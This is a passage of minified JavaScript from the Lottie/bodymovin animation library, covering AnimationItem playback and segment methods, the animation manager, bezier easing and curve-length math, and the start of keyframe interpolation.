        (AnimationItem.prototype.loadSegments = function () {
          var i = this.animationData.segments;
          i || (this.timeCompleted = this.totalFrames), this.loadNextSegment();
        }),
        (AnimationItem.prototype.imagesLoaded = function () {
          this.trigger("loaded_images"), this.checkLoaded();
        }),
        (AnimationItem.prototype.preloadImages = function () {
          this.imagePreloader.setAssetsPath(this.assetsPath),
            this.imagePreloader.setPath(this.path),
            this.imagePreloader.loadAssets(
              this.animationData.assets,
              this.imagesLoaded.bind(this)
            );
        }),
        (AnimationItem.prototype.configAnimation = function (i) {
          if (this.renderer)
            try {
              (this.animationData = i),
                this.initialSegment
                  ? ((this.totalFrames = Math.floor(
                      this.initialSegment[1] - this.initialSegment[0]
                    )),
                    (this.firstFrame = Math.round(this.initialSegment[0])))
                  : ((this.totalFrames = Math.floor(
                      this.animationData.op - this.animationData.ip
                    )),
                    (this.firstFrame = Math.round(this.animationData.ip))),
                this.renderer.configAnimation(i),
                i.assets || (i.assets = []),
                (this.assets = this.animationData.assets),
                (this.frameRate = this.animationData.fr),
                (this.frameMult = this.animationData.fr / 1e3),
                this.renderer.searchExtraCompositions(i.assets),
                (this.markers = markerParser(i.markers || [])),
                this.trigger("config_ready"),
                this.preloadImages(),
                this.loadSegments(),
                this.updaFrameModifier(),
                this.waitForFontsLoaded(),
                this.isPaused && this.audioController.pause();
            } catch (a) {
              this.triggerConfigError(a);
            }
        }),
        (AnimationItem.prototype.waitForFontsLoaded = function () {
          this.renderer &&
            (this.renderer.globalData.fontManager.isLoaded
              ? this.checkLoaded()
              : setTimeout(this.waitForFontsLoaded.bind(this), 20));
        }),
        (AnimationItem.prototype.checkLoaded = function () {
          if (
            !this.isLoaded &&
            this.renderer.globalData.fontManager.isLoaded &&
            (this.imagePreloader.loadedImages() ||
              this.renderer.rendererType !== "canvas") &&
            this.imagePreloader.loadedFootages()
          ) {
            this.isLoaded = !0;
            var i = getExpressionsPlugin();
            i && i.initExpressions(this),
              this.renderer.initItems(),
              setTimeout(
                function () {
                  this.trigger("DOMLoaded");
                }.bind(this),
                0
              ),
              this.gotoFrame(),
              this.autoplay && this.play();
          }
        }),
        (AnimationItem.prototype.resize = function (i, a) {
          var o = typeof i == "number" ? i : void 0,
            s = typeof a == "number" ? a : void 0;
          this.renderer.updateContainerSize(o, s);
        }),
        (AnimationItem.prototype.setSubframe = function (i) {
          this.isSubframeEnabled = !!i;
        }),
        (AnimationItem.prototype.gotoFrame = function () {
          (this.currentFrame = this.isSubframeEnabled
            ? this.currentRawFrame
            : ~~this.currentRawFrame),
            this.timeCompleted !== this.totalFrames &&
              this.currentFrame > this.timeCompleted &&
              (this.currentFrame = this.timeCompleted),
            this.trigger("enterFrame"),
            this.renderFrame(),
            this.trigger("drawnFrame");
        }),
        (AnimationItem.prototype.renderFrame = function () {
          if (!(this.isLoaded === !1 || !this.renderer))
            try {
              this.expressionsPlugin && this.expressionsPlugin.resetFrame(),
                this.renderer.renderFrame(this.currentFrame + this.firstFrame);
            } catch (i) {
              this.triggerRenderFrameError(i);
            }
        }),
        (AnimationItem.prototype.play = function (i) {
          (i && this.name !== i) ||
            (this.isPaused === !0 &&
              ((this.isPaused = !1),
              this.trigger("_play"),
              this.audioController.resume(),
              this._idle && ((this._idle = !1), this.trigger("_active"))));
        }),
        (AnimationItem.prototype.pause = function (i) {
          (i && this.name !== i) ||
            (this.isPaused === !1 &&
              ((this.isPaused = !0),
              this.trigger("_pause"),
              (this._idle = !0),
              this.trigger("_idle"),
              this.audioController.pause()));
        }),
        (AnimationItem.prototype.togglePause = function (i) {
          (i && this.name !== i) ||
            (this.isPaused === !0 ? this.play() : this.pause());
        }),
        (AnimationItem.prototype.stop = function (i) {
          (i && this.name !== i) ||
            (this.pause(),
            (this.playCount = 0),
            (this._completedLoop = !1),
            this.setCurrentRawFrameValue(0));
        }),
        (AnimationItem.prototype.getMarkerData = function (i) {
          for (var a, o = 0; o < this.markers.length; o += 1)
            if (((a = this.markers[o]), a.payload && a.payload.name === i))
              return a;
          return null;
        }),
        (AnimationItem.prototype.goToAndStop = function (i, a, o) {
          if (!(o && this.name !== o)) {
            var s = Number(i);
            if (isNaN(s)) {
              var tt = this.getMarkerData(i);
              tt && this.goToAndStop(tt.time, !0);
            } else
              a
                ? this.setCurrentRawFrameValue(i)
                : this.setCurrentRawFrameValue(i * this.frameModifier);
            this.pause();
          }
        }),
        (AnimationItem.prototype.goToAndPlay = function (i, a, o) {
          if (!(o && this.name !== o)) {
            var s = Number(i);
            if (isNaN(s)) {
              var tt = this.getMarkerData(i);
              tt &&
                (tt.duration
                  ? this.playSegments([tt.time, tt.time + tt.duration], !0)
                  : this.goToAndStop(tt.time, !0));
            } else this.goToAndStop(s, a, o);
            this.play();
          }
        }),
        (AnimationItem.prototype.advanceTime = function (i) {
          if (!(this.isPaused === !0 || this.isLoaded === !1)) {
            var a = this.currentRawFrame + i * this.frameModifier,
              o = !1;
            a >= this.totalFrames - 1 && this.frameModifier > 0
              ? !this.loop || this.playCount === this.loop
                ? this.checkSegments(
                    a > this.totalFrames ? a % this.totalFrames : 0
                  ) || ((o = !0), (a = this.totalFrames - 1))
                : a >= this.totalFrames
                ? ((this.playCount += 1),
                  this.checkSegments(a % this.totalFrames) ||
                    (this.setCurrentRawFrameValue(a % this.totalFrames),
                    (this._completedLoop = !0),
                    this.trigger("loopComplete")))
                : this.setCurrentRawFrameValue(a)
              : a < 0
              ? this.checkSegments(a % this.totalFrames) ||
                (this.loop && !(this.playCount-- <= 0 && this.loop !== !0)
                  ? (this.setCurrentRawFrameValue(
                      this.totalFrames + (a % this.totalFrames)
                    ),
                    this._completedLoop
                      ? this.trigger("loopComplete")
                      : (this._completedLoop = !0))
                  : ((o = !0), (a = 0)))
              : this.setCurrentRawFrameValue(a),
              o &&
                (this.setCurrentRawFrameValue(a),
                this.pause(),
                this.trigger("complete"));
          }
        }),
        (AnimationItem.prototype.adjustSegment = function (i, a) {
          (this.playCount = 0),
            i[1] < i[0]
              ? (this.frameModifier > 0 &&
                  (this.playSpeed < 0
                    ? this.setSpeed(-this.playSpeed)
                    : this.setDirection(-1)),
                (this.totalFrames = i[0] - i[1]),
                (this.timeCompleted = this.totalFrames),
                (this.firstFrame = i[1]),
                this.setCurrentRawFrameValue(this.totalFrames - 0.001 - a))
              : i[1] > i[0] &&
                (this.frameModifier < 0 &&
                  (this.playSpeed < 0
                    ? this.setSpeed(-this.playSpeed)
                    : this.setDirection(1)),
                (this.totalFrames = i[1] - i[0]),
                (this.timeCompleted = this.totalFrames),
                (this.firstFrame = i[0]),
                this.setCurrentRawFrameValue(0.001 + a)),
            this.trigger("segmentStart");
        }),
        (AnimationItem.prototype.setSegment = function (i, a) {
          var o = -1;
          this.isPaused &&
            (this.currentRawFrame + this.firstFrame < i
              ? (o = i)
              : this.currentRawFrame + this.firstFrame > a && (o = a - i)),
            (this.firstFrame = i),
            (this.totalFrames = a - i),
            (this.timeCompleted = this.totalFrames),
            o !== -1 && this.goToAndStop(o, !0);
        }),
        (AnimationItem.prototype.playSegments = function (i, a) {
          if ((a && (this.segments.length = 0), _typeof$4(i[0]) === "object")) {
            var o,
              s = i.length;
            for (o = 0; o < s; o += 1) this.segments.push(i[o]);
          } else this.segments.push(i);
          this.segments.length &&
            a &&
            this.adjustSegment(this.segments.shift(), 0),
            this.isPaused && this.play();
        }),
        (AnimationItem.prototype.resetSegments = function (i) {
          (this.segments.length = 0),
            this.segments.push([this.animationData.ip, this.animationData.op]),
            i && this.checkSegments(0);
        }),
        (AnimationItem.prototype.checkSegments = function (i) {
          return this.segments.length
            ? (this.adjustSegment(this.segments.shift(), i), !0)
            : !1;
        }),
        (AnimationItem.prototype.destroy = function (i) {
          (i && this.name !== i) ||
            !this.renderer ||
            (this.renderer.destroy(),
            this.imagePreloader.destroy(),
            this.trigger("destroy"),
            (this._cbs = null),
            (this.onEnterFrame = null),
            (this.onLoopComplete = null),
            (this.onComplete = null),
            (this.onSegmentStart = null),
            (this.onDestroy = null),
            (this.renderer = null),
            (this.expressionsPlugin = null),
            (this.imagePreloader = null),
            (this.projectInterface = null));
        }),
        (AnimationItem.prototype.setCurrentRawFrameValue = function (i) {
          (this.currentRawFrame = i), this.gotoFrame();
        }),
        (AnimationItem.prototype.setSpeed = function (i) {
          (this.playSpeed = i), this.updaFrameModifier();
        }),
        (AnimationItem.prototype.setDirection = function (i) {
          (this.playDirection = i < 0 ? -1 : 1), this.updaFrameModifier();
        }),
        (AnimationItem.prototype.setLoop = function (i) {
          this.loop = i;
        }),
        (AnimationItem.prototype.setVolume = function (i, a) {
          (a && this.name !== a) || this.audioController.setVolume(i);
        }),
        (AnimationItem.prototype.getVolume = function () {
          return this.audioController.getVolume();
        }),
        (AnimationItem.prototype.mute = function (i) {
          (i && this.name !== i) || this.audioController.mute();
        }),
        (AnimationItem.prototype.unmute = function (i) {
          (i && this.name !== i) || this.audioController.unmute();
        }),
        (AnimationItem.prototype.updaFrameModifier = function () {
          (this.frameModifier =
            this.frameMult * this.playSpeed * this.playDirection),
            this.audioController.setRate(this.playSpeed * this.playDirection);
        }),
        (AnimationItem.prototype.getPath = function () {
          return this.path;
        }),
        (AnimationItem.prototype.getAssetsPath = function (i) {
          var a = "";
          if (i.e) a = i.p;
          else if (this.assetsPath) {
            var o = i.p;
            o.indexOf("images/") !== -1 && (o = o.split("/")[1]),
              (a = this.assetsPath + o);
          } else (a = this.path), (a += i.u ? i.u : ""), (a += i.p);
          return a;
        }),
        (AnimationItem.prototype.getAssetData = function (i) {
          for (var a = 0, o = this.assets.length; a < o; ) {
            if (i === this.assets[a].id) return this.assets[a];
            a += 1;
          }
          return null;
        }),
        (AnimationItem.prototype.hide = function () {
          this.renderer.hide();
        }),
        (AnimationItem.prototype.show = function () {
          this.renderer.show();
        }),
        (AnimationItem.prototype.getDuration = function (i) {
          return i ? this.totalFrames : this.totalFrames / this.frameRate;
        }),
        (AnimationItem.prototype.updateDocumentData = function (i, a, o) {
          try {
            var s = this.renderer.getElementByPath(i);
            s.updateDocumentData(a, o);
          } catch {}
        }),
        (AnimationItem.prototype.trigger = function (i) {
          if (this._cbs && this._cbs[i])
            switch (i) {
              case "enterFrame":
                this.triggerEvent(
                  i,
                  new BMEnterFrameEvent(
                    i,
                    this.currentFrame,
                    this.totalFrames,
                    this.frameModifier
                  )
                );
                break;
              case "drawnFrame":
                (this.drawnFrameEvent.currentTime = this.currentFrame),
                  (this.drawnFrameEvent.totalTime = this.totalFrames),
                  (this.drawnFrameEvent.direction = this.frameModifier),
                  this.triggerEvent(i, this.drawnFrameEvent);
                break;
              case "loopComplete":
                this.triggerEvent(
                  i,
                  new BMCompleteLoopEvent(
                    i,
                    this.loop,
                    this.playCount,
                    this.frameMult
                  )
                );
                break;
              case "complete":
                this.triggerEvent(i, new BMCompleteEvent(i, this.frameMult));
                break;
              case "segmentStart":
                this.triggerEvent(
                  i,
                  new BMSegmentStartEvent(i, this.firstFrame, this.totalFrames)
                );
                break;
              case "destroy":
                this.triggerEvent(i, new BMDestroyEvent(i, this));
                break;
              default:
                this.triggerEvent(i);
            }
          i === "enterFrame" &&
            this.onEnterFrame &&
            this.onEnterFrame.call(
              this,
              new BMEnterFrameEvent(
                i,
                this.currentFrame,
                this.totalFrames,
                this.frameMult
              )
            ),
            i === "loopComplete" &&
              this.onLoopComplete &&
              this.onLoopComplete.call(
                this,
                new BMCompleteLoopEvent(
                  i,
                  this.loop,
                  this.playCount,
                  this.frameMult
                )
              ),
            i === "complete" &&
              this.onComplete &&
              this.onComplete.call(
                this,
                new BMCompleteEvent(i, this.frameMult)
              ),
            i === "segmentStart" &&
              this.onSegmentStart &&
              this.onSegmentStart.call(
                this,
                new BMSegmentStartEvent(i, this.firstFrame, this.totalFrames)
              ),
            i === "destroy" &&
              this.onDestroy &&
              this.onDestroy.call(this, new BMDestroyEvent(i, this));
        }),
        (AnimationItem.prototype.triggerRenderFrameError = function (i) {
          var a = new BMRenderFrameErrorEvent(i, this.currentFrame);
          this.triggerEvent("error", a),
            this.onError && this.onError.call(this, a);
        }),
        (AnimationItem.prototype.triggerConfigError = function (i) {
          var a = new BMConfigErrorEvent(i, this.currentFrame);
          this.triggerEvent("error", a),
            this.onError && this.onError.call(this, a);
        });
      var animationManager = (function () {
          var i = {},
            a = [],
            o = 0,
            s = 0,
            tt = 0,
            nt = !0,
            ot = !1;
          function st(Mt) {
            for (var Ft = 0, Tt = Mt.target; Ft < s; )
              a[Ft].animation === Tt &&
                (a.splice(Ft, 1), (Ft -= 1), (s -= 1), Tt.isPaused || St()),
                (Ft += 1);
          }
          function ft(Mt, Ft) {
            if (!Mt) return null;
            for (var Tt = 0; Tt < s; ) {
              if (a[Tt].elem === Mt && a[Tt].elem !== null)
                return a[Tt].animation;
              Tt += 1;
            }
            var At = new AnimationItem();
            return vt(At, Mt), At.setData(Mt, Ft), At;
          }
          function ht() {
            var Mt,
              Ft = a.length,
              Tt = [];
            for (Mt = 0; Mt < Ft; Mt += 1) Tt.push(a[Mt].animation);
            return Tt;
          }
          function gt() {
            (tt += 1), Nt();
          }
          function St() {
            tt -= 1;
          }
          function vt(Mt, Ft) {
            Mt.addEventListener("destroy", st),
              Mt.addEventListener("_active", gt),
              Mt.addEventListener("_idle", St),
              a.push({ elem: Ft, animation: Mt }),
              (s += 1);
          }
          function _t(Mt) {
            var Ft = new AnimationItem();
            return vt(Ft, null), Ft.setParams(Mt), Ft;
          }
          function Et(Mt, Ft) {
            var Tt;
            for (Tt = 0; Tt < s; Tt += 1) a[Tt].animation.setSpeed(Mt, Ft);
          }
          function Ct(Mt, Ft) {
            var Tt;
            for (Tt = 0; Tt < s; Tt += 1) a[Tt].animation.setDirection(Mt, Ft);
          }
          function Pt(Mt) {
            var Ft;
            for (Ft = 0; Ft < s; Ft += 1) a[Ft].animation.play(Mt);
          }
          function bt(Mt) {
            var Ft = Mt - o,
              Tt;
            for (Tt = 0; Tt < s; Tt += 1) a[Tt].animation.advanceTime(Ft);
            (o = Mt), tt && !ot ? window.requestAnimationFrame(bt) : (nt = !0);
          }
          function xt(Mt) {
            (o = Mt), window.requestAnimationFrame(bt);
          }
          function yt(Mt) {
            var Ft;
            for (Ft = 0; Ft < s; Ft += 1) a[Ft].animation.pause(Mt);
          }
          function wt(Mt, Ft, Tt) {
            var At;
            for (At = 0; At < s; At += 1)
              a[At].animation.goToAndStop(Mt, Ft, Tt);
          }
          function $t(Mt) {
            var Ft;
            for (Ft = 0; Ft < s; Ft += 1) a[Ft].animation.stop(Mt);
          }
          function kt(Mt) {
            var Ft;
            for (Ft = 0; Ft < s; Ft += 1) a[Ft].animation.togglePause(Mt);
          }
          function Rt(Mt) {
            var Ft;
            for (Ft = s - 1; Ft >= 0; Ft -= 1) a[Ft].animation.destroy(Mt);
          }
          function It(Mt, Ft, Tt) {
            var At = [].concat(
                [].slice.call(document.getElementsByClassName("lottie")),
                [].slice.call(document.getElementsByClassName("bodymovin"))
              ),
              Lt,
              jt = At.length;
            for (Lt = 0; Lt < jt; Lt += 1)
              Tt && At[Lt].setAttribute("data-bm-type", Tt), ft(At[Lt], Mt);
            if (Ft && jt === 0) {
              Tt || (Tt = "svg");
              var Dt = document.getElementsByTagName("body")[0];
              Dt.innerText = "";
              var Ut = createTag("div");
              (Ut.style.width = "100%"),
                (Ut.style.height = "100%"),
                Ut.setAttribute("data-bm-type", Tt),
                Dt.appendChild(Ut),
                ft(Ut, Mt);
            }
          }
          function Ot() {
            var Mt;
            for (Mt = 0; Mt < s; Mt += 1) a[Mt].animation.resize();
          }
          function Nt() {
            !ot && tt && nt && (window.requestAnimationFrame(xt), (nt = !1));
          }
          function zt() {
            ot = !0;
          }
          function Bt() {
            (ot = !1), Nt();
          }
          function Wt(Mt, Ft) {
            var Tt;
            for (Tt = 0; Tt < s; Tt += 1) a[Tt].animation.setVolume(Mt, Ft);
          }
          function Gt(Mt) {
            var Ft;
            for (Ft = 0; Ft < s; Ft += 1) a[Ft].animation.mute(Mt);
          }
          function Vt(Mt) {
            var Ft;
            for (Ft = 0; Ft < s; Ft += 1) a[Ft].animation.unmute(Mt);
          }
          return (
            (i.registerAnimation = ft),
            (i.loadAnimation = _t),
            (i.setSpeed = Et),
            (i.setDirection = Ct),
            (i.play = Pt),
            (i.pause = yt),
            (i.stop = $t),
            (i.togglePause = kt),
            (i.searchAnimations = It),
            (i.resize = Ot),
            (i.goToAndStop = wt),
            (i.destroy = Rt),
            (i.freeze = zt),
            (i.unfreeze = Bt),
            (i.setVolume = Wt),
            (i.mute = Gt),
            (i.unmute = Vt),
            (i.getRegisteredAnimations = ht),
            i
          );
        })(),
        BezierFactory = (function () {
          var i = {};
          i.getBezierEasing = o;
          var a = {};
          function o(xt, yt, wt, $t, kt) {
            var Rt =
              kt ||
              ("bez_" + xt + "_" + yt + "_" + wt + "_" + $t).replace(
                /\./g,
                "p"
              );
            if (a[Rt]) return a[Rt];
            var It = new bt([xt, yt, wt, $t]);
            return (a[Rt] = It), It;
          }
          var s = 4,
            tt = 0.001,
            nt = 1e-7,
            ot = 10,
            st = 11,
            ft = 1 / (st - 1),
            ht = typeof Float32Array == "function";
          function gt(xt, yt) {
            return 1 - 3 * yt + 3 * xt;
          }
          function St(xt, yt) {
            return 3 * yt - 6 * xt;
          }
          function vt(xt) {
            return 3 * xt;
          }
          function _t(xt, yt, wt) {
            return ((gt(yt, wt) * xt + St(yt, wt)) * xt + vt(yt)) * xt;
          }
          function Et(xt, yt, wt) {
            return 3 * gt(yt, wt) * xt * xt + 2 * St(yt, wt) * xt + vt(yt);
          }
          function Ct(xt, yt, wt, $t, kt) {
            var Rt,
              It,
              Ot = 0;
            do
              (It = yt + (wt - yt) / 2),
                (Rt = _t(It, $t, kt) - xt),
                Rt > 0 ? (wt = It) : (yt = It);
            while (Math.abs(Rt) > nt && ++Ot < ot);
            return It;
          }
          function Pt(xt, yt, wt, $t) {
            for (var kt = 0; kt < s; ++kt) {
              var Rt = Et(yt, wt, $t);
              if (Rt === 0) return yt;
              var It = _t(yt, wt, $t) - xt;
              yt -= It / Rt;
            }
            return yt;
          }
          function bt(xt) {
            (this._p = xt),
              (this._mSampleValues = ht ? new Float32Array(st) : new Array(st)),
              (this._precomputed = !1),
              (this.get = this.get.bind(this));
          }
          return (
            (bt.prototype = {
              get: function (yt) {
                var wt = this._p[0],
                  $t = this._p[1],
                  kt = this._p[2],
                  Rt = this._p[3];
                return (
                  this._precomputed || this._precompute(),
                  wt === $t && kt === Rt
                    ? yt
                    : yt === 0
                    ? 0
                    : yt === 1
                    ? 1
                    : _t(this._getTForX(yt), $t, Rt)
                );
              },
              _precompute: function () {
                var yt = this._p[0],
                  wt = this._p[1],
                  $t = this._p[2],
                  kt = this._p[3];
                (this._precomputed = !0),
                  (yt !== wt || $t !== kt) && this._calcSampleValues();
              },
              _calcSampleValues: function () {
                for (
                  var yt = this._p[0], wt = this._p[2], $t = 0;
                  $t < st;
                  ++$t
                )
                  this._mSampleValues[$t] = _t($t * ft, yt, wt);
              },
              _getTForX: function (yt) {
                for (
                  var wt = this._p[0],
                    $t = this._p[2],
                    kt = this._mSampleValues,
                    Rt = 0,
                    It = 1,
                    Ot = st - 1;
                  It !== Ot && kt[It] <= yt;
                  ++It
                )
                  Rt += ft;
                --It;
                var Nt = (yt - kt[It]) / (kt[It + 1] - kt[It]),
                  zt = Rt + Nt * ft,
                  Bt = Et(zt, wt, $t);
                return Bt >= tt
                  ? Pt(yt, zt, wt, $t)
                  : Bt === 0
                  ? zt
                  : Ct(yt, Rt, Rt + ft, wt, $t);
              },
            }),
            i
          );
        })(),
        pooling = (function () {
          function i(a) {
            return a.concat(createSizedArray(a.length));
          }
          return { double: i };
        })(),
        poolFactory = (function () {
          return function (i, a, o) {
            var s = 0,
              tt = i,
              nt = createSizedArray(tt),
              ot = { newElement: st, release: ft };
            function st() {
              var ht;
              return s ? ((s -= 1), (ht = nt[s])) : (ht = a()), ht;
            }
            function ft(ht) {
              s === tt && ((nt = pooling.double(nt)), (tt *= 2)),
                o && o(ht),
                (nt[s] = ht),
                (s += 1);
            }
            return ot;
          };
        })(),
        bezierLengthPool = (function () {
          function i() {
            return {
              addedLength: 0,
              percents: createTypedArray("float32", getDefaultCurveSegments()),
              lengths: createTypedArray("float32", getDefaultCurveSegments()),
            };
          }
          return poolFactory(8, i);
        })(),
        segmentsLengthPool = (function () {
          function i() {
            return { lengths: [], totalLength: 0 };
          }
          function a(o) {
            var s,
              tt = o.lengths.length;
            for (s = 0; s < tt; s += 1) bezierLengthPool.release(o.lengths[s]);
            o.lengths.length = 0;
          }
          return poolFactory(8, i, a);
        })();
      function bezFunction() {
        var i = Math;
        function a(vt, _t, Et, Ct, Pt, bt) {
          var xt = vt * Ct + _t * Pt + Et * bt - Pt * Ct - bt * vt - Et * _t;
          return xt > -0.001 && xt < 0.001;
        }
        function o(vt, _t, Et, Ct, Pt, bt, xt, yt, wt) {
          if (Et === 0 && bt === 0 && wt === 0)
            return a(vt, _t, Ct, Pt, xt, yt);
          var $t = i.sqrt(
              i.pow(Ct - vt, 2) + i.pow(Pt - _t, 2) + i.pow(bt - Et, 2)
            ),
            kt = i.sqrt(
              i.pow(xt - vt, 2) + i.pow(yt - _t, 2) + i.pow(wt - Et, 2)
            ),
            Rt = i.sqrt(
              i.pow(xt - Ct, 2) + i.pow(yt - Pt, 2) + i.pow(wt - bt, 2)
            ),
            It;
          return (
            $t > kt
              ? $t > Rt
                ? (It = $t - kt - Rt)
                : (It = Rt - kt - $t)
              : Rt > kt
              ? (It = Rt - kt - $t)
              : (It = kt - $t - Rt),
            It > -1e-4 && It < 1e-4
          );
        }
        var s = (function () {
          return function (vt, _t, Et, Ct) {
            var Pt = getDefaultCurveSegments(),
              bt,
              xt,
              yt,
              wt,
              $t,
              kt = 0,
              Rt,
              It = [],
              Ot = [],
              Nt = bezierLengthPool.newElement();
            for (yt = Et.length, bt = 0; bt < Pt; bt += 1) {
              for ($t = bt / (Pt - 1), Rt = 0, xt = 0; xt < yt; xt += 1)
                (wt =
                  bmPow(1 - $t, 3) * vt[xt] +
                  3 * bmPow(1 - $t, 2) * $t * Et[xt] +
                  3 * (1 - $t) * bmPow($t, 2) * Ct[xt] +
                  bmPow($t, 3) * _t[xt]),
                  (It[xt] = wt),
                  Ot[xt] !== null && (Rt += bmPow(It[xt] - Ot[xt], 2)),
                  (Ot[xt] = It[xt]);
              Rt && ((Rt = bmSqrt(Rt)), (kt += Rt)),
                (Nt.percents[bt] = $t),
                (Nt.lengths[bt] = kt);
            }
            return (Nt.addedLength = kt), Nt;
          };
        })();
        function tt(vt) {
          var _t = segmentsLengthPool.newElement(),
            Et = vt.c,
            Ct = vt.v,
            Pt = vt.o,
            bt = vt.i,
            xt,
            yt = vt._length,
            wt = _t.lengths,
            $t = 0;
          for (xt = 0; xt < yt - 1; xt += 1)
            (wt[xt] = s(Ct[xt], Ct[xt + 1], Pt[xt], bt[xt + 1])),
              ($t += wt[xt].addedLength);
          return (
            Et &&
              yt &&
              ((wt[xt] = s(Ct[xt], Ct[0], Pt[xt], bt[0])),
              ($t += wt[xt].addedLength)),
            (_t.totalLength = $t),
            _t
          );
        }
        function nt(vt) {
          (this.segmentLength = 0), (this.points = new Array(vt));
        }
        function ot(vt, _t) {
          (this.partialLength = vt), (this.point = _t);
        }
        var st = (function () {
          var vt = {};
          return function (_t, Et, Ct, Pt) {
            var bt = (
              _t[0] +
              "_" +
              _t[1] +
              "_" +
              Et[0] +
              "_" +
              Et[1] +
              "_" +
              Ct[0] +
              "_" +
              Ct[1] +
              "_" +
              Pt[0] +
              "_" +
              Pt[1]
            ).replace(/\./g, "p");
            if (!vt[bt]) {
              var xt = getDefaultCurveSegments(),
                yt,
                wt,
                $t,
                kt,
                Rt,
                It = 0,
                Ot,
                Nt,
                zt = null;
              _t.length === 2 &&
                (_t[0] !== Et[0] || _t[1] !== Et[1]) &&
                a(_t[0], _t[1], Et[0], Et[1], _t[0] + Ct[0], _t[1] + Ct[1]) &&
                a(_t[0], _t[1], Et[0], Et[1], Et[0] + Pt[0], Et[1] + Pt[1]) &&
                (xt = 2);
              var Bt = new nt(xt);
              for ($t = Ct.length, yt = 0; yt < xt; yt += 1) {
                for (
                  Nt = createSizedArray($t), Rt = yt / (xt - 1), Ot = 0, wt = 0;
                  wt < $t;
                  wt += 1
                )
                  (kt =
                    bmPow(1 - Rt, 3) * _t[wt] +
                    3 * bmPow(1 - Rt, 2) * Rt * (_t[wt] + Ct[wt]) +
                    3 * (1 - Rt) * bmPow(Rt, 2) * (Et[wt] + Pt[wt]) +
                    bmPow(Rt, 3) * Et[wt]),
                    (Nt[wt] = kt),
                    zt !== null && (Ot += bmPow(Nt[wt] - zt[wt], 2));
                (Ot = bmSqrt(Ot)),
                  (It += Ot),
                  (Bt.points[yt] = new ot(Ot, Nt)),
                  (zt = Nt);
              }
              (Bt.segmentLength = It), (vt[bt] = Bt);
            }
            return vt[bt];
          };
        })();
        function ft(vt, _t) {
          var Et = _t.percents,
            Ct = _t.lengths,
            Pt = Et.length,
            bt = bmFloor((Pt - 1) * vt),
            xt = vt * _t.addedLength,
            yt = 0;
          if (bt === Pt - 1 || bt === 0 || xt === Ct[bt]) return Et[bt];
          for (var wt = Ct[bt] > xt ? -1 : 1, $t = !0; $t; )
            if (
              (Ct[bt] <= xt && Ct[bt + 1] > xt
                ? ((yt = (xt - Ct[bt]) / (Ct[bt + 1] - Ct[bt])), ($t = !1))
                : (bt += wt),
              bt < 0 || bt >= Pt - 1)
            ) {
              if (bt === Pt - 1) return Et[bt];
              $t = !1;
            }
          return Et[bt] + (Et[bt + 1] - Et[bt]) * yt;
        }
        function ht(vt, _t, Et, Ct, Pt, bt) {
          var xt = ft(Pt, bt),
            yt = 1 - xt,
            wt =
              i.round(
                (yt * yt * yt * vt[0] +
                  (xt * yt * yt + yt * xt * yt + yt * yt * xt) * Et[0] +
                  (xt * xt * yt + yt * xt * xt + xt * yt * xt) * Ct[0] +
                  xt * xt * xt * _t[0]) *
                  1e3
              ) / 1e3,
            $t =
              i.round(
                (yt * yt * yt * vt[1] +
                  (xt * yt * yt + yt * xt * yt + yt * yt * xt) * Et[1] +
                  (xt * xt * yt + yt * xt * xt + xt * yt * xt) * Ct[1] +
                  xt * xt * xt * _t[1]) *
                  1e3
              ) / 1e3;
          return [wt, $t];
        }
        var gt = createTypedArray("float32", 8);
        function St(vt, _t, Et, Ct, Pt, bt, xt) {
          Pt < 0 ? (Pt = 0) : Pt > 1 && (Pt = 1);
          var yt = ft(Pt, xt);
          bt = bt > 1 ? 1 : bt;
          var wt = ft(bt, xt),
            $t,
            kt = vt.length,
            Rt = 1 - yt,
            It = 1 - wt,
            Ot = Rt * Rt * Rt,
            Nt = yt * Rt * Rt * 3,
            zt = yt * yt * Rt * 3,
            Bt = yt * yt * yt,
            Wt = Rt * Rt * It,
            Gt = yt * Rt * It + Rt * yt * It + Rt * Rt * wt,
            Vt = yt * yt * It + Rt * yt * wt + yt * Rt * wt,
            Mt = yt * yt * wt,
            Ft = Rt * It * It,
            Tt = yt * It * It + Rt * wt * It + Rt * It * wt,
            At = yt * wt * It + Rt * wt * wt + yt * It * wt,
            Lt = yt * wt * wt,
            jt = It * It * It,
            Dt = wt * It * It + It * wt * It + It * It * wt,
            Ut = wt * wt * It + It * wt * wt + wt * It * wt,
            Ht = wt * wt * wt;
          for ($t = 0; $t < kt; $t += 1)
            (gt[$t * 4] =
              i.round(
                (Ot * vt[$t] + Nt * Et[$t] + zt * Ct[$t] + Bt * _t[$t]) * 1e3
              ) / 1e3),
              (gt[$t * 4 + 1] =
                i.round(
                  (Wt * vt[$t] + Gt * Et[$t] + Vt * Ct[$t] + Mt * _t[$t]) * 1e3
                ) / 1e3),
              (gt[$t * 4 + 2] =
                i.round(
                  (Ft * vt[$t] + Tt * Et[$t] + At * Ct[$t] + Lt * _t[$t]) * 1e3
                ) / 1e3),
              (gt[$t * 4 + 3] =
                i.round(
                  (jt * vt[$t] + Dt * Et[$t] + Ut * Ct[$t] + Ht * _t[$t]) * 1e3
                ) / 1e3);
          return gt;
        }
        return {
          getSegmentsLength: tt,
          getNewSegment: St,
          getPointInSegment: ht,
          buildBezierData: st,
          pointOnLine2D: a,
          pointOnLine3D: o,
        };
      }
      var bez = bezFunction(),
        initFrame = initialDefaultFrame,
        mathAbs = Math.abs;
      function interpolateValue(i, a) {
        var o = this.offsetTime,
          s;
        this.propType === "multidimensional" &&
          (s = createTypedArray("float32", this.pv.length));
        for (
          var tt = a.lastIndex,
            nt = tt,
            ot = this.keyframes.length - 1,
            st = !0,
            ft,
            ht,
            gt;
          st;

        ) {
          if (
            ((ft = this.keyframes[nt]),
            (ht = this.keyframes[nt + 1]),
            nt === ot - 1 && i >= ht.t - o)
          ) {
            ft.h && (ft = ht), (tt = 0);
            break;
          }
          if (ht.t - o > i) {
            tt = nt;
            break;
          }
          nt < ot - 1 ? (nt += 1) : ((tt = 0), (st = !1));
        }
        gt = this.keyframesMetadata[nt] || {};
        var St,
          vt,
          _t,
          Et,
          Ct,
          Pt,
          bt = ht.t - o,
          xt = ft.t - o,
          yt;
        if (ft.to) {
          gt.bezierData ||
            (gt.bezierData = bez.buildBezierData(
              ft.s,
              ht.s || ft.e,
              ft.to,
              ft.ti
            ));
          var wt = gt.bezierData;
          if (i >= bt || i < xt) {
            var $t = i >= bt ? wt.points.length - 1 : 0;
            for (vt = wt.points[$t].point.length, St = 0; St < vt; St += 1)
              s[St] = wt.points[$t].point[St];
          } else {
            gt.__fnct
              ? (Pt = gt.__fnct)
              : ((Pt = BezierFactory.getBezierEasing(
                  ft.o.x,
                  ft.o.y,
